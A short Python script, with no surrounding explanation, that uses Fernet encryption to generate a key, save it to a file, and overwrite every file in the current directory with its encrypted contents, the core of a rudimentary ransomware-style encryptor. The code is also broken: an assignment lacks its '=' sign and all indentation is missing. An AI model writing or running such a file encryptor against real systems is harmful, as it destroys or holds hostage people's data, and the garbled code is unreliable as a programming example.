from cryptography.fernet import Fernet
import os
key Fernet.generate_key()
with open("mykey.key", "wb") as mk:
mk.write(key)
f=Fernet (key)
files=os.listdir()
for x in files:
with open (x, "rb") as o_r:
original=o_r.read()
encrypted=f.encrypt(original)
with open(x, "wb") as o_w:
o_w.write(encrypted)